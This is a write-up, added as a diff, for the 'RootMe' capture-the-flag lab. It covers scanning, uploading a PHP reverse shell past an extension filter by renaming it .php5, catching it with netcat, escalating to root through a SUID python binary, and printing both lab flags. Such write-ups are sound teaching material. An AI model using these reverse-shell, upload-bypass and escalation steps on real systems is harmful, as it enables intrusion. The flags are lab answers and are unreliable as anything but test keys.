@@ -1,0 +1,112 @@
+# RootMe — Writeup
+
+## Objective
+Gain a shell on the target (10.66.175.19) via a file upload vulnerability
+and escalate to root via a SUID misconfiguration.
+
+## 1. Nmap Scan
+```
+nmap -sC -sV -p- 10.66.175.19
+```
+**Result:** Two open ports:
+- `22/tcp` — OpenSSH 8.2p1 (Ubuntu)
+- `80/tcp` — Apache httpd 2.4.41 — site titled "HackIT"
+
+Note: `PHPSESSID` cookie without `httponly` flag visible in nmap output
+— confirms PHP is running on the web server, which is relevant for the
+upload attack.
+
+## 2. Directory Brute-Force with Gobuster
+```
+gobuster dir -u http://10.66.175.19 -w common.txt
+```
+**Notable results:**
+- `/panel/` — file upload page (the attack surface)
+- `/uploads/` — where uploaded files are served from
+
+## 3. Gaining a Shell — File Upload Bypass
+
+Copied the Kali pre-built PHP reverse shell and edited LHOST/port:
+```
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+```
+
+Started a listener:
+```
+nc -lvnp 4444
+```
+
+Attempted to upload `shell.php` via `/panel/` — server rejected it
+with an error (PHP extension blocked by the upload filter).
+
+**Bypassed the filter by renaming the extension to `.php5`:**
+```
+cp shell.php shell.php5
+```
+
+Uploaded `shell.php5` — accepted successfully. Navigated to:
+```
+http://10.66.175.19/uploads/shell.php5
+```
+
+Shell caught by the listener:
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## 4. User Flag
+```
+find / -type f -name "user.txt" 2>/dev/null
+cat /var/www/user.txt
+```
+```
+THM{y0u_g0t_a_sh3ll}
+```
+
+## 5. Privilege Escalation — SUID Python Binary
+
+Searched for files with the SUID bit set:
+```
+find / -user root -perm -4000 2>/dev/null
+```
+Found: `/usr/bin/python`
+
+Python with SUID set is a known GTFOBins escalation — the `-p` flag
+tells bash to preserve the elevated effective UID rather than dropping
+it on start:
+```
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+Result: root shell.
+
+## 6. Root Flag
+```
+find / -type f -name "root.txt" 2>/dev/null
+cat /root/root.txt
+```
+```
+THM{pr1v1l3g3_3sc4l4t10n}
+```
+
+## Flags
+```
+THM{y0u_g0t_a_sh3ll}         — /var/www/user.txt
+THM{pr1v1l3g3_3sc4l4t10n}    — /root/root.txt
+```
+
+## Summary
+Nmap revealed a PHP web server on port 80. Gobuster found a hidden
+`/panel/` upload page and a corresponding `/uploads/` directory. A
+standard PHP reverse shell was blocked by the upload filter, but
+renaming the extension to `.php5` bypassed it — the server executed
+the file as PHP regardless. Initial access was as `www-data`. A SUID
+search found `/usr/bin/python` owned by root with the SUID bit set —
+a GTFOBins one-liner escalated directly to root.
+
+## Lessons learned / notes for next time
+- When `.php` is blocked try alternative PHP extensions before
+  anything more complex: `.php5`, `.phtml`, `.pHp`, `.php.jpg`
+- Always run a SUID search early in privesc — it's fast and often
+  the quickest path
+- GTFOBins is the reference for what to do once a SUID binary is
+  found — check it for every binary that comes up
